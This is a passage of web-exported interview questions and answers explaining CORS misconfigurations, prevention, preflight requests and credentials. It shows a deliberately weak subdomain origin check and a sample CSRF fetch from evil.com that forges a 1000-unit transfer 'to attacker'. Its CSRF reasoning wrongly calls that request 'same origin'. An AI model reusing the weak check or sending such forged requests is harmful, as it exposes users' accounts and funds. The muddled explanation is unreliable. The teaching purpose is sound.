Access-Control-Allow-Credentials: true</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8052-9d4f-fb603d71f83b" class="numbered-list" start="2"><li><strong>Wildcard with Credentials:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-808d-9e7d-f9fc4571fe34" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8008-9f02-d8d946e71eef" class="bulleted-list"><li style="list-style-type:disc">Browsers should reject, but misconfigurations may exist</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8082-b3e9-fa5ced6d4f22" class="numbered-list" start="3"><li><strong>Overly Permissive Origins:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8080-8c78-c5f53eaa45b4" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Allows any subdomainif (origin &amp;&amp; origin.endsWith(&#x27;.example.com&#x27;)) {
  res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, origin);}</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80be-a49b-c120a49c505c" class="bulleted-list"><li style="list-style-type:disc">Attacker can register <code>evil.example.com</code></li></ul></div></li></ol></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80d0-affc-d7969df130c4" class=""><strong>Impact:</strong><br/>- Sensitive data exposure<br/>- Credential theft<br/>- CSRF attacks<br/>- Unauthorized API access</p></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-80e5-b633-f80157633f51"/></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80c6-b608-f9e99e1a3a90" class="">Q14: How do you prevent CORS vulnerabilities?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80a9-9e21-e6c3167f805f" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8025-99f9-f6edc276aea8" class=""><strong>Best Practices:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80b7-85dc-eca69c6d93b5" class="numbered-list" start="1"><li><strong>Whitelist Specific Origins:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8093-aa3c-d215976611c9" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const allowedOrigins = [
  &#x27;https://example.com&#x27;,  &#x27;https://app.example.com&#x27;];if (allowedOrigins.includes(origin)) {
  res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, origin);}</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8060-93fc-db95f18df824" class="numbered-list" start="2"><li><strong>Validate Origin Header:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-802d-b93f-ec65cccfe0d9" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Don&#x27;t blindly reflect Origin// Always validate against whitelist</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8033-b179-f003303328f2" class="numbered-list" start="3"><li><strong>Never Use Wildcard with Credentials:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8099-b2ff-e7a56dec0f93" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ❌ WRONGAccess-Control-Allow-Origin: *Access-Control-Allow-Credentials: true// ✅ CORRECTAccess-Control-Allow-Origin: https://example.comAccess-Control-Allow-Credentials: true</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-805c-a349-d611fd3ee518" class="numbered-list" start="4"><li><strong>Limit Methods and Headers:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-808e-b704-c2d0d262c86d" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">res.setHeader(&#x27;Access-Control-Allow-Methods&#x27;, &#x27;GET, POST&#x27;);res.setHeader(&#x27;Access-Control-Allow-Headers&#x27;, &#x27;Content-Type&#x27;);</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80d8-8b22-eff7cd22aded" class="numbered-list" start="5"><li><strong>Handle Preflight Properly:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8076-a5e9-c38460ed1340" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">if (req.method === &#x27;OPTIONS&#x27;) {
  // Validate preflight request  // Return appropriate CORS headers  return res.sendStatus(200);}</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-803d-8dfa-f4ae2de11ba5" class="numbered-list" start="6"><li><strong>Use Environment Variables:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80fe-889c-d9e0da0ee745" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const allowedOrigins = process.env.ALLOWED_ORIGINS.split(&#x27;,&#x27;);</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-805b-96ec-fb7f75dad8c4" class="numbered-list" start="7"><li><strong>Regular Security Audits:</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-806e-a29d-f2b6db27ad4b" class="bulleted-list"><li style="list-style-type:disc">Test CORS configuration</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-801e-b677-ecf545b7148e" class="bulleted-list"><li style="list-style-type:disc">Use automated scanning tools</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80af-9540-c8b25cbd1ffd" class="bulleted-list"><li style="list-style-type:disc">Review origin whitelist regularly</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-80b1-b312-e9e3d20fec67"/></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-803d-a306-e885a9f6766b" class="">Q15: Does CORS protect against CSRF attacks?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80b7-82c9-e5c9e4f18fbc" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-802d-be3c-c34f161d32b7" class=""><strong>No, CORS does NOT protect against CSRF attacks.</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80bd-9917-e0a474cd8772" class=""><strong>Why:</strong><br/>- CORS only affects browser-enforced restrictions<br/>- CSRF attacks work by tricking the browser into making requests<br/>- If CORS allows the origin, the browser will send the request<br/>- CORS headers are sent by the server, not validated for CSRF protection</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-808a-ad76-f29083549ff9" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-802b-9313-d540a453ecfa" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// CORS allows https://example.comAccess-Control-Allow-Origin: https://example.comAccess-Control-Allow-Credentials: true// Attacker&#x27;s website: evil.com// User is logged into example.com// Attacker tricks user into visiting evil.com// CSRF attack still works:fetch(&#x27;https://example.com/api/transfer&#x27;, {
  method: &#x27;POST&#x27;,  credentials: &#x27;include&#x27;,  body: JSON.stringify({to: &#x27;attacker&#x27;, amount: 1000})
});// Browser sends request with cookies// CORS allows it (same origin)// CSRF attack succeeds</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-801e-b3d9-ca99d51a72aa" class=""><strong>What Actually Protects Against CSRF:</strong><br/>- CSRF tokens<br/>- SameSite cookie attribute<br/>- Custom headers (e.g., X-Requested-With)<br/>- Origin validation (but not CORS itself)</p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8098-b442-c89facef7a71" class=""><strong>Important:</strong><br/>- CORS can actually make CSRF easier if misconfigured<br/>- Always use CSRF tokens in addition to CORS<br/>- Use SameSite cookie attribute</p></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-801b-bdf9-d7ac16088b7a"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-806f-91fe-d5e6ae3d1382" class="">Advanced Questions</h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80a8-b395-f1cca73e97c0" class="">Q16: Explain the preflight request flow in detail.</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80ca-8aac-feeedd70404a" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80e6-b8b7-e22655fc3c8f" class=""><strong>Preflight Request Flow:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80a3-8bf5-d4abd96173f8" class="numbered-list" start="1"><li><strong>Browser detects non-simple request:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80a2-b441-d1281e883b75" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">fetch(&#x27;https://api.example.com/data&#x27;, {
  method: &#x27;PUT&#x27;,  headers: {
    &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,    &#x27;X-Custom-Header&#x27;: &#x27;value&#x27;  },  body: JSON.stringify({key: &#x27;value&#x27;})
});</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-804c-a015-cf19b586fa47" class="numbered-list" start="2"><li><strong>Browser sends OPTIONS request (preflight):</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80b4-9647-e53f69d93d52" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">OPTIONS /api/data HTTP/1.1
Host: api.example.com
Origin: https://example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, X-Custom-Header</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80cf-9bd6-d20cdb6d4cf4" class="numbered-list" start="3"><li><strong>Server responds to preflight:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80a9-8b74-e19541b624cc" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT
Access-Control-Allow-Headers: Content-Type, X-Custom-Header
Access-Control-Max-Age: 86400</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80a4-a652-ee8aadb04288" class="numbered-list" start="4"><li><strong>Browser checks preflight response:</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8038-9963-cd028506dcab" class="bulleted-list"><li style="list-style-type:disc">If origin is allowed → Proceed</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-809b-8a5e-f9bc8a8300fb" class="bulleted-list"><li style="list-style-type:disc">If method is allowed → Proceed</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8095-b905-debb40d8d529" class="bulleted-list"><li style="list-style-type:disc">If headers are allowed → Proceed</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8059-bdc0-ca80d4cf60e2" class="bulleted-list"><li style="list-style-type:disc">If any check fails → Block request</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8092-a5f3-fa82dce00197" class="numbered-list" start="5"><li><strong>If preflight passes, browser sends actual request:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8023-ba23-d4bf61b38ca8" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">PUT /api/data HTTP/1.1
Host: api.example.com
Origin: https://example.com
Content-Type: application/json
X-Custom-Header: value

{&quot;key&quot;: &quot;value&quot;}</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80cd-b0d4-e4909617cb28" class="numbered-list" start="6"><li><strong>Server responds to actual request:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8012-b51f-d25543978545" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://example.com
Content-Type: application/json

{&quot;success&quot;: true}</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80b0-9424-c8cc724c963c" class=""><strong>Important:</strong><br/>- Preflight is <strong>automatic</strong> (browser handles it)<br/>- You don’t need to manually send OPTIONS requests<br/>- Preflight is a <strong>browser optimization</strong> to avoid sending unsafe requests<br/>- Preflight results can be <strong>cached</strong> (Access-Control-Max-Age)</p></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8036-a7c2-e9bacaef1da0"/></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-801d-b5a5-f7905ba299b4" class="">Q17: What happens if you don’t handle preflight requests properly?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80f9-8bae-cd3af4ff09c5" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-807e-8998-ddb6ad52c37c" class=""><strong>Consequences:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-800e-a609-ed57e44baaae" class="numbered-list" start="1"><li><strong>Requests Blocked:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80c8-9944-f801e9bfeb7a" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Browser sends preflight// Server doesn&#x27;t respond with CORS headers// Browser blocks the actual request// Error: &quot;CORS policy blocked&quot;</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80c2-84d3-fcd2a6621508" class="numbered-list" start="2"><li><strong>Inconsistent Behavior:</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80b1-b76c-d54199d20969" class="bulleted-list"><li style="list-style-type:disc">Some requests work (simple requests)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-800a-9a2b-c84e24bbe493" class="bulleted-list"><li style="list-style-type:disc">Some requests fail (non-simple requests)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-804e-a79d-fe032b2b3740" class="bulleted-list"><li style="list-style-type:disc">Difficult to debug</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80dd-bcdb-e93799785494" class="numbered-list" start="3"><li><strong>Security Issues:</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80ac-b5f6-e839c7bbc184" class="bulleted-list"><li style="list-style-type:disc">If preflight is not validated, may allow unauthorized requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-803e-8d61-deaab2e3592b" class="bulleted-list"><li style="list-style-type:disc">Overly permissive preflight responses</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80aa-be83-ef9064e5a8ff" class=""><strong>Proper Handling:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-800d-bc58-fad624554c41" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Handle preflightif (req.method === &#x27;OPTIONS&#x27;) {
  const origin = req.headers.origin;  if (allowedOrigins.includes(origin)) {
    res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, origin);    res.setHeader(&#x27;Access-Control-Allow-Methods&#x27;, &#x27;GET, POST, PUT, DELETE&#x27;);    res.setHeader(&#x27;Access-Control-Allow-Headers&#x27;, &#x27;Content-Type, Authorization&#x27;);    res.setHeader(&#x27;Access-Control-Max-Age&#x27;, &#x27;86400&#x27;);  }
  return res.sendStatus(200);}</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-809a-a62b-f0ce1151c8b9"/></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8064-b25d-cc8294dc7620" class="">Q18: How does CORS work with credentials (cookies, authentication)?</h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80db-aecb-e24609475fc8" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-807d-bacf-e1879c522b2f" class=""><strong>Enabling Credentials:</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-802e-89cf-e0de770ba681" class=""><strong>Client-side:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-802e-8ae2-f64584962e16" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">fetch(&#x27;https://api.example.com/data&#x27;, {
  credentials: &#x27;include&#x27;  // Send cookies});</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-807f-9df9-ca44022142fc" class=""><strong>Server-side:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8023-acc2-fb85eb638ad7" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Origin: https://example.com
